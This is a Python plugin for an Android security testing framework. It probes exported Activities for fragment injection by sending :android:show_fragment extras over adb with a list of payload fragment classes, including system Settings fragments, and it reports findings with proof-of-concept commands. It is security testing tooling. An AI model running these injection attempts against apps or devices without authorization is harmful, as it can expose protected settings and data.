"""FragmentInjectorPlugin — test exported Activities for fragment injection via extras."""

from __future__ import annotations

import asyncio
import re
from typing import TYPE_CHECKING

from backend.plugins.base import (
    BasePlugin,
    PluginCategory,
    PluginFinding,
    IntentSpec,
    PoC,
)

if TYPE_CHECKING:
    from backend.core.device_manager import DeviceHandle
    from backend.core.apk_analyzer import APKAnalysis


_CRASH_RE = re.compile(
    r"(FATAL EXCEPTION|ClassNotFoundException|InstantiationException|"
    r"IllegalAccessException|Fragment.*Exception|InflateException|"
    r"NullPointerException|SecurityException)",
    re.IGNORECASE,
)

_FRAGMENT_LOADED_RE = re.compile(
    r"(Instantiated fragment|onAttach|onCreateView|Fragment.*created|"
    r"isValidFragment|PreferenceActivity|getFragmentManager)",
    re.IGNORECASE,
)

# Fragment class names to try injecting
_FRAGMENT_PAYLOADS = [
    # Android internal fragments that reveal settings / info
    "android.app.Fragment",
    "com.android.settings.ChooseLockGeneric$ChooseLockGenericFragment",
    "com.android.settings.users.UserSettings",
    "com.android.settings.DevelopmentSettings",
    "com.android.settings.wifi.WifiSettings",
    "com.android.settings.applications.InstalledAppDetails",
    # Generic class traversal
    "java.lang.Object",
    "com.android.internal.os.ZygoteInit",
    # Attacker-controlled
    "com.attacker.EvilFragment",
]

# Extra keys used for fragment injection
_FRAGMENT_EXTRAS = [
    ":android:show_fragment",
    ":android:show_fragment_arguments",
    ":android:show_fragment_title",
    "android.intent.extra.FRAGMENT_ARG_KEY",
    "show_fragment",
    "fragment",
]


class FragmentInjectorPlugin(BasePlugin):
    name = "fragment_injector"
    display_name = "Fragment Injector"
    description = (
        "Tests exported Activities (especially PreferenceActivity subclasses) "
        "for fragment injection via :android:show_fragment extras."
    )
    version = "1.0.0"
    category = PluginCategory.FUZZER
    requires_device = True
    attack_vectors = [
        "fragment_injection",
        "preference_activity_bypass",
    ]

    async def run(self, analysis, device, progress_callback=None) -> list[PluginFinding]:
        findings: list[PluginFinding] = []
        pkg = analysis.package_name

        # Candidates: exported activities, especially those extending PreferenceActivity
        candidates = [
            c for c in analysis.components
            if c.type == "activity" and c.exported
        ]
        total = len(candidates)
        if not total:
            return findings

        # Check if any activity names suggest PreferenceActivity
        pref_activities = [
            c for c in candidates
            if any(kw in c.name.lower() for kw in (
                "preference", "settings", "config", "option",
            ))
        ]
        # Test preference-like activities first, then others
        ordered = pref_activities + [c for c in candidates if c not in pref_activities]

        for idx, comp in enumerate(ordered):
            if self.is_cancelled:
                break

            fqn = f"{pkg}/{comp.name}"
            comp_findings = await self._test_fragment_injection(device, fqn, comp, pkg)
            findings.extend(comp_findings)

            if progress_callback:
                await progress_callback(
                    plugin=self.name,
                    progress=(idx + 1) / total,
                    message=f"Tested {comp.name}",
                )

        return findings

    # ------------------------------------------------------------------
    async def _test_fragment_injection(self, device, fqn, comp, pkg) -> list[PluginFinding]:
        results: list[PluginFinding] = []

        for fragment_class in _FRAGMENT_PAYLOADS:
            if self.is_cancelled:
                return results

            for extra_key in _FRAGMENT_EXTRAS:
                await device.clear_logcat()
                extras = {extra_key: fragment_class}
                # Also send fragment arguments if applicable
                if extra_key == ":android:show_fragment":
                    extras[":android:show_fragment_arguments"] = ""

                spec = IntentSpec(component=fqn, extras=extras)
                out = await device.start_activity(spec.to_adb_args())
                await asyncio.sleep(1)
                logcat = await device.logcat_snapshot(lines=300)
                combined = logcat + "\n" + out

                # Case 1: Fragment was successfully loaded (bypass isValidFragment)
                if _FRAGMENT_LOADED_RE.search(combined) and fragment_class in combined:
                    results.append(PluginFinding(
                        title=f"Fragment injection — {comp.name}",
                        description=(
                            f"Activity {comp.name} loads arbitrary fragments via "
                            f"'{extra_key}' extra. Successfully loaded: {fragment_class}. "
                            f"This bypasses isValidFragment() check (or it's not implemented). "
                            f"An attacker can load privileged fragments to access "
                            f"protected settings or data."
                        ),
                        severity="high",
                        component_name=comp.name,
                        component_type="activity",
                        cvss_score=7.7,
                        cwe_id="CWE-470",
                        mstg_id="MSTG-PLATFORM-2",
                        owasp_mobile="M1",
                        poc_command=spec.to_adb_command("start"),
                        logcat_snippet=self._trim_logcat(logcat, fragment_class),
                        evidence={
                            "extra_key": extra_key,
                            "fragment_class": fragment_class,
                            "status": "loaded",
                        },
                    ))
                    return results  # confirmed, no need to test more

                # Case 2: ClassNotFoundException = activity processes the extra but class
                # is not found. This still means the injection vector works.
                if "ClassNotFoundException" in combined and fragment_class in combined:
                    results.append(PluginFinding(
                        title=f"Fragment injection vector confirmed — {comp.name}",
                        description=(
                            f"Activity {comp.name} attempts to load the fragment class "
                            f"'{fragment_class}' from '{extra_key}' extra. Got "
                            f"ClassNotFoundException, confirming the injection vector is "
                            f"active. An attacker can load any fragment class present in "
                            f"the app's classpath."
                        ),
                        severity="high",
                        component_name=comp.name,
                        component_type="activity",
                        cvss_score=7.0,
                        cwe_id="CWE-470",
                        mstg_id="MSTG-PLATFORM-2",
                        owasp_mobile="M1",
                        poc_command=spec.to_adb_command("start"),
                        logcat_snippet=self._trim_logcat(logcat, "ClassNotFoundException"),
                        evidence={
                            "extra_key": extra_key,
                            "fragment_class": fragment_class,
                            "status": "class_not_found_but_processed",
                        },
                    ))
                    return results

                # Case 3: crash from processing fragment extra
                crash_match = _CRASH_RE.search(combined)
                if crash_match and extra_key in combined:
                    results.append(PluginFinding(
                        title=f"Crash via fragment injection — {comp.name}",
                        description=(
                            f"Sending '{extra_key}={fragment_class}' to {comp.name} "
                            f"causes {crash_match.group(0)}. The activity processes "
                            f"fragment extras from untrusted input."
                        ),
                        severity="medium",
                        component_name=comp.name,
                        component_type="activity",
                        cwe_id="CWE-470",
                        mstg_id="MSTG-PLATFORM-2",
                        owasp_mobile="M1",
                        poc_command=spec.to_adb_command("start"),
                        logcat_snippet=self._trim_logcat(logcat, crash_match.group(0)),
                        evidence={
                            "extra_key": extra_key,
                            "fragment_class": fragment_class,
                            "exception": crash_match.group(0),
                        },
                    ))
                    return results

        # Static: check if activity name suggests PreferenceActivity subclass
        # even if dynamic test didn't confirm
        name_lower = comp.name.lower()
        if any(kw in name_lower for kw in ("preference", "settings")):
            results.append(PluginFinding(
                title=f"Potential PreferenceActivity fragment injection — {comp.name}",
                description=(
                    f"Exported activity {comp.name} appears to be a PreferenceActivity "
                    f"subclass. If isValidFragment() is not overridden (Android < 4.4 "
                    f"or missing check), arbitrary fragment loading is possible."
                ),
                severity="low",
                component_name=comp.name,
                component_type="activity",
                cwe_id="CWE-470",
                mstg_id="MSTG-PLATFORM-2",
                owasp_mobile="M1",
                evidence={"heuristic": "name_contains_preference_or_settings"},
            ))

        return results

    @staticmethod
    def _trim_logcat(logcat: str, keyword: str, context: int = 10) -> str:
        lines = logcat.splitlines()
        for i, line in enumerate(lines):
            if keyword in line:
                start = max(0, i - context)
                end = min(len(lines), i + context + 1)
                return "\n".join(lines[start:end])
        return logcat[-1500:] if len(logcat) > 1500 else logcat

    async def generate_poc(self, finding: PluginFinding) -> PoC | None:
        if finding.poc_command:
            return PoC(
                poc_type="adb_command",
                commands=[finding.poc_command],
                expected_result="Fragment loaded or ClassNotFoundException confirming injection vector",
            )
        return None
